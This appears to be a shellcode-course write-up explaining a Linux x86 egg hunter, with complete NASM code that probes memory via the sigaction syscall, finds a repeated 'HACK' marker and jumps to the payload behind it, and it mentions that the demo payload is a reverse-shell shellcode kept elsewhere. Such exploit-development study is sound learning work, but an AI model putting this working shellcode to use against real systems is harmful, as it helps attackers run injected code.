## Task

The task is to create a demo of an egg hunter that will locate and execute a shellcode payload for Linux on the x86 architecture. The goal is to avoid null bytes while making the egg hunter as small as possible.

Additionally, it should be easy to change the payload used in the demo.

## Solution

The solution is based on the [egg hunter](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) written by Matt Miller. The egg hunter will search through the virtual address space looking for an "egg string" reapeated twice. It will then continue execution after this signature.

The egg string is defined at the top of the NASM source of the egg hunter:

```nasm
global _start

egg equ 0x4b434148  ; "HACK" in ASCII (little endian)
```

The egg hunter will align to a page boundary and use the [sigaction](https://man7.org/linux/man-pages/man2/sigaction.2.html) system call to check if the memory at that location is readable. This is possible because the system call will verify 16 bytes of memory at the location pointed to by the ECX register. If the memory is not readable, it will continue to the next memory page and repeat this process:

```nasm
section .text

_start:
    ; Align ECX to page boundary (page size = 4096). We don't care about the initial value of ECX (it'll wrap around).
    or cx, 0xfff
continue:
    inc ecx
    
    ; Call 'sigaction' to check read access of memory.
    ; int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact): syscall 0x43
    ;     sigaction(whatever, memory_address, whatever)
    push 0x43
    pop eax
    int 0x80
    
    ; Check if EFAULT (= 14 -> -14 = 0xf2) is returned. If that's the case, move on to the next page.
    cmp al, 0xf2
    je _start
```

The egg hunter will then do a string comparison of the current memory location and the repeated egg string. If there is a match, execution will continue after this signature where the payload should be placed:

```nasm
    ; Compare the current four bytes of memory to the egg. If it doesn't match, move on to the next address.
    mov eax, egg
    mov edi, ecx
    scasd
    jne continue
    
    ; Compare the next four bytes of memory to the egg. If it doesn't match, move on to the next address.
    scasd
    jne continue
    
    ; We found the egg! Jump to the payload following it.
    jmp edi
```

The demo written in C contains the TCP reverse shell shellcode from the [previous assignment](2) prepended with the repeated egg string as the payload. The egg hunter is executed and will locate and execute the payload. The source code of the demo can be found here: [egghunter_demo.c](https://github.com/SpacePlant/slae32/blob/main/egghunter_demo.c)
